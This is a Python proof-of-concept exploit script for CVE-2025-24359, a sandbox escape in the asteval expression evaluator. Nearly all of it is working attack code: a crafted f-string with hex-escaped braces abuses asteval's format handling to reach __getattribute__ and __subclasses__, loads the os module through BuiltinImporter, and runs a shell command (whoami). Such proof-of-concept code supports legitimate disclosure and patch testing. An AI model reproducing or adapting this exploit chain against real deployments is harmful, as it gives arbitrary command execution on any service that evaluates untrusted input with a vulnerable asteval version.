#!/usr/bin/env python3
"""
CVE-2025-24359 Proof of Concept Exploit
Demonstrates sandbox escape via maliciously crafted format strings in asteval.

This PoC exploits the vulnerable on_formattedvalue method which unsafely calls
fmt.format(__fstring__=val). By crafting a malicious format string, we can
trigger an AttributeError and access the exception's obj attribute to obtain
references to protected classes and methods, enabling arbitrary code execution.
"""

from asteval import Interpreter

def exploit():
    """Execute the sandbox escape exploit."""
    aeval = Interpreter()

    # The exploit code uses hex escape sequences to bypass string filtering
    # \x7B = { and \x7D = }
    # The format string tricks Python into giving us access to __getattribute__
    # which we can then use to access any attribute including __subclasses__
    code = '''
def pwn():
    try:
        f"{dict.mro()[1]:'\\x7B__fstring__.__getattribute__.s\\x7D'}"
    except Exception as ga:
        ga = ga.obj
        sub = ga(dict.mro()[1],"__subclasses__")()
        importer = None
        for i in sub:
            if "BuiltinImporter" in str(i):
                importer = i.load_module
                break
        os = importer("os")
        os.system("whoami")

pwn()
'''
    print("[*] Executing exploit...")
    aeval(code)
    print("[*] Exploit completed")

if __name__ == "__main__":
    exploit()
